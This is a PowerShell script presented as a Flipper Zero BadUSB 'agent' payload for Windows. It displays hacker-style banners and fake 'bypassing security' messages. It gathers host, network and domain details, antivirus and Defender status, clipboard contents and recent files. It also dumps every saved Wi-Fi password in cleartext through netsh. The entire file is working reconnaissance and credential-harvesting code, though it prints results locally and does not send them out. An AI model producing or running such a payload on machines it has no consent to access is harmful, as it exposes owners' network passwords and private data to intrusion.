[Console]::CursorVisible = $false
Clear-Host

$art = @(
" ____  _   _ ___ _____ _____ _____ ____  ",
"/ ___|| \ | |_ _|  ___|  ___|  ____|  _ \ ",
"\___ \|  \| || || |_  | |_  |  _| | |_) |",
" ___) | |\  || ||  _| |  _| | |___|  _ < ",
"|____/|_| \_|___|_|   |_|   |_____|_| \_\",
"                                           ",
"     [ FLIPPER ZERO // BADUSB AGENT ]     "
)
$colors = @('DarkGreen','Green','Cyan','Green','DarkGreen','DarkGreen','DarkCyan')
for ($i = 0; $i -lt $art.Count; $i++) {
    Write-Host $art[$i] -ForegroundColor $colors[$i]
    Start-Sleep -Milliseconds 80
}
Write-Host ""

function Spin {
    param([string]$Msg, [int]$Ms = 600)
    $spin = [char[]]'|/-\'
    Write-Host -NoNewline "  [" -ForegroundColor DarkCyan
    Write-Host -NoNewline " " -ForegroundColor Yellow
    Write-Host -NoNewline "] $Msg " -ForegroundColor Cyan
    $end = (Get-Date).AddMilliseconds($Ms); $i = 0
    while ((Get-Date) -lt $end) {
        Write-Host -NoNewline "$($spin[$i++ % 4])`b" -ForegroundColor Yellow
        Start-Sleep -Milliseconds 80
    }
    Write-Host "`r  [" -NoNewline -ForegroundColor DarkCyan
    Write-Host "+" -NoNewline -ForegroundColor Green
    Write-Host "] $Msg DONE   " -ForegroundColor Green
}

function Hdr {
    param([string]$T, [string]$C = 'Cyan')
    Write-Host ""
    Write-Host "  +--[ $T ]" -ForegroundColor $C
}

Spin "Initializing..." 800
Spin "Bypassing security..." 600
Spin "Establishing session..." 500
Write-Host ""

# ---------- SYSTEM ----------
Spin "System recon" 400
Hdr "SYSTEM" Green
$os = Get-CimInstance Win32_OperatingSystem
$cs = Get-CimInstance Win32_ComputerSystem
$cpu = (Get-CimInstance Win32_Processor | Select-Object -First 1).Name
$computer = $env:COMPUTERNAME; $user = $env:USERNAME
$domain = if ($cs.PartOfDomain) { "Domain: $($cs.Domain)" } else { "Workgroup: $($cs.Domain)" }
$uptime = [Math]::Round(((Get-Date) - $os.LastBootUpTime).TotalHours, 1)
$ramGB  = [Math]::Round($cs.TotalPhysicalMemory / 1GB, 1)
Write-Host "  | Computer:  $computer"
Write-Host "  | User:      $user"
Write-Host "  | Domain:    $domain"
Write-Host "  | OS:        $($os.Caption) $($os.OSArchitecture)"
Write-Host "  | Uptime:    $uptime hr  |  RAM: $ramGB GB"
Write-Host "  | CPU:       $cpu"

# ---------- DISK ----------
Spin "Disk enum" 300
Hdr "DISKS" Green
Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" | ForEach-Object {
    $t = [Math]::Round($_.Size/1GB,1); $f = [Math]::Round($_.FreeSpace/1GB,1)
    Write-Host ("  | {0}  {1,6} GB total  {2,6} GB free" -f $_.DeviceID, $t, $f)
}

# ---------- NETWORK ----------
Spin "Network recon" 500
Hdr "NETWORK" Blue
$publicIP = "ERROR"
foreach ($uri in @("https://api.ipify.org","https://icanhazip.com","https://ifconfig.me/ip")) {
    try { $publicIP = (Invoke-RestMethod -Uri $uri -TimeoutSec 3).Trim(); break } catch {}
}
$localIP = $gateway = $mac = ""
$iface = Get-NetIPConfiguration | Where-Object {
    $_.IPv4Address -and $_.IPv4DefaultGateway -and $_.NetAdapter.Status -eq "Up"
} | Select-Object -First 1
if ($iface) {
    $localIP = $iface.IPv4Address.IPAddress
    $gateway = $iface.IPv4DefaultGateway.NextHop
    $mac     = $iface.NetAdapter.MacAddress
}
Write-Host "  | Public IP:   $publicIP"
Write-Host "  | Local IP:    $(if($localIP){$localIP}else{'Not found'})"
Write-Host "  | MAC:         $(if($mac){$mac}else{'Not found'})"
Write-Host "  | Gateway:     $(if($gateway){$gateway}else{'Not found'})"
Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | ForEach-Object {
    Write-Host "  |   [$($_.InterfaceAlias)]  $($_.MacAddress)  $($_.LinkSpeed)"
}

# ---------- WI-FI ----------
Spin "Wi-Fi scan" 500
Hdr "WI-FI" Magenta
$wifiRaw = netsh wlan show interfaces 2>$null
$ssid = $bssid = $signal = ""
if ($wifiRaw) {
    $r = { param($pat) $m = ($wifiRaw | Select-String -Pattern $pat | Select-Object -First 1); if ($m) { $m.Matches.Groups[1].Value.Trim() } else { "" } }
    $ssid   = & $r '^\s+SSID\s+:\s+(.+)$'
    $bssid  = & $r '^\s+BSSID\s+:\s+(.+)$'
    $signal = & $r '^\s+Signal\s+:\s+(.+)$'
    Write-Host "  | SSID:    $ssid"
    Write-Host "  | BSSID:   $bssid"
    Write-Host "  | Signal:  $signal"
} else { Write-Host "  | No Wi-Fi interface." -ForegroundColor Red }

Hdr "SAVED WI-FI PASSWORDS" Magenta
$profiles = netsh wlan show profiles 2>$null |
    Select-String -Pattern 'All User Profile\s*:\s*(.+)' |
    ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
if ($profiles) {
    foreach ($p in $profiles) {
        $detail  = netsh wlan show profile name="`"$p`"" key=clear 2>$null
        $passMat = ($detail | Select-String -Pattern 'Key Content\s*:\s*(.+)' | Select-Object -First 1)
        $pass    = if ($passMat) { $passMat.Matches.Groups[1].Value.Trim() } else { "<admin required>" }
        $col     = if ($passMat) { "Green" } else { "DarkYellow" }
        Write-Host "  | [$p]  =>  $pass" -ForegroundColor $col
    }
} else { Write-Host "  | No profiles." -ForegroundColor Red }

# ---------- CLIPBOARD ----------
Hdr "CLIPBOARD" Yellow
try {
    $clip = Get-Clipboard -EA Stop
    if ($clip) { Write-Host "  | $clip" -ForegroundColor Green }
    else { Write-Host "  | (empty)" }
} catch { Write-Host "  | (unavailable)" }

# ---------- RECENT FILES ----------
Hdr "RECENT FILES" Yellow
$recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
if (Test-Path $recentPath) {
    Get-ChildItem $recentPath -EA SilentlyContinue |
        Sort-Object LastWriteTime -Descending | Select-Object -First 3 |
        ForEach-Object { Write-Host "  | $($_.LastWriteTime.ToString('MM-dd HH:mm'))  $($_.BaseName)" }
}

# ---------- SECURITY ----------
Spin "AV check" 300
Hdr "SECURITY" Red
try {
    $av = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct -EA Stop
    if ($av) { $av | ForEach-Object { Write-Host "  | AV: $($_.displayName)" } }
    else { Write-Host "  | No AV detected." }
} catch { Write-Host "  | SecurityCenter2 inaccessible." }
try {
    $rtState = if ((Get-MpComputerStatus -EA Stop).RealTimeProtectionEnabled) { "ON" } else { "OFF" }
    Write-Host "  | Defender RTP: $rtState"
} catch {}

# ---------- PROCESSES ----------
Hdr "TOP 7 PROCESSES" Cyan
Get-Process | Sort-Object CPU -Descending | Select-Object -First 7 | ForEach-Object {
    Write-Host ("  | {0,-28} CPU:{1,7}s  RAM:{2,7}MB" -f $_.Name, [Math]::Round($_.CPU,1), [Math]::Round($_.PM/1MB,1))
}

# ---------- SUMMARY ----------
Write-Host ""
Write-Host "  +------------------------------------------+" -ForegroundColor Cyan
Write-Host "  |              SUMMARY                     |" -ForegroundColor Cyan
Write-Host "  +------------------------------------------+" -ForegroundColor Cyan
Write-Host "  | Computer:  $computer" -ForegroundColor White
Write-Host "  | User:      $user" -ForegroundColor White
Write-Host "  | $domain" -ForegroundColor White
Write-Host "  | OS:        $($os.Caption)" -ForegroundColor White
Write-Host "  | Public IP: $publicIP" -ForegroundColor White
Write-Host "  | Local IP:  $localIP" -ForegroundColor White
Write-Host "  | Wi-Fi:     $ssid" -ForegroundColor White
Write-Host "  +------------------------------------------+" -ForegroundColor Cyan
Write-Host ""

[Console]::CursorVisible = $true
Write-Host "  Press any key to exit..." -ForegroundColor DarkGray
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
